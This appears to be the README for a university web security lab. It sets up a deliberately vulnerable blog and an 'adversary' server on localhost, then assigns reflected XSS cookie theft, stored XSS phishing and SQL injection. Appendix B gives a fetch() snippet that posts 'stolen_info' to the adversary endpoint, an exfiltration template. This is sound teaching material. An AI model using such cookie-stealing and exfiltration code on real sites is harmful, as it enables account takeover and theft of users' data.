# 🧑‍💻 Cyber-Squad (CPEN 442 Final Project)

## Setting Up the Environment
### Setting up the Database
1.	Install a SQL client. For our project we used the MySQL client which can be installed from here: https://dev.mysql.com/downloads/installer/ 
2.	To create the necessary databases to run the project, we used the MySQL workbench which can be installed from here: https://dev.mysql.com/downloads/workbench/ 
3. Execute the SQL statements shown below in the query terminal on MySQL workbench after connecting to a database. This will create the blog and adversary databases. The necessary tables and initial rows for the tables will be created when the servers for the adversary webpage and blog web page are started.

### Setting up the web servers and the web pages
1.	Download the zip file called web_security_project.zip, and extract the contents
2.	Open the extracted folder in some text editor (ex. VS Code)
3.	In the terminal, run the following commands to install the necessary dependencies to run the web applications.
```
cd frontend; npm install
cd ../blog_web_app; npm install
cd ../adversary_web_app; npm install
```
4.	To run the whole project, you will need to open 4 terminals: \
a. In terminal 1, run: ```cd frontend; npm start```\
b. In terminal 2, run: ```cd blog_web_app; npm start```\
c. In terminal 3, run: ```cd adversary_web_app; npm start ```\
d. In terminal 4, run: ```cd adversary_web_app; node index.js ```
5.	Now, you will able to see the blog site web page at http://localhost:8080 and the adversary web page at  http://localhost:8081 

## The assignment
You will create a web attack for each of these 3 types of attacks: 
### Reflected XSS attack
* Craft a malicious link that can be sent to an unexpecting user such that when they click on their link, their cookies from the CyberSquad Blog website are sent to the adversary database
* Cookies on a web page can be accessed via ```document.cookie```
* The adversary web app has an API endpoint that can be used to send stolen information to the database. Check Appendix B for an example of how to use this API with a fetch request in JavaScript. If you are finding that the fetch request is not being made, try removing all space characters in the fetch request.
### Stored XSS attack
* Craft a malicious blog post that can be used to steal some information from an unexpecting user that loads the blog site
* The approach that we recommend is trying to phish the user and trick them into revealing some sensitive information (such as their password). This does not have to be automatic and can require some user input
### SQL Injection
* Inspect the code base and find a way that you can inject malicious SQL in the web page to perform a malicious action
* This attack does not require you to send some information to the adversary database

Appendix A
SQL statements for creating the blog post database:
CREATE DATABASE blogdb;

SQL statements for creating the adversary database:
CREATE DATABASE adversary_database
Appendix B
fetch('http://localhost:4000/stolenInfo', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({ 'stolen_info': 'test1'}),
        })
        .then(function (response) {response.json()})
        .then(function(data){console.log(data)})
        .catch(function(error) {console.error('Error:', error)});

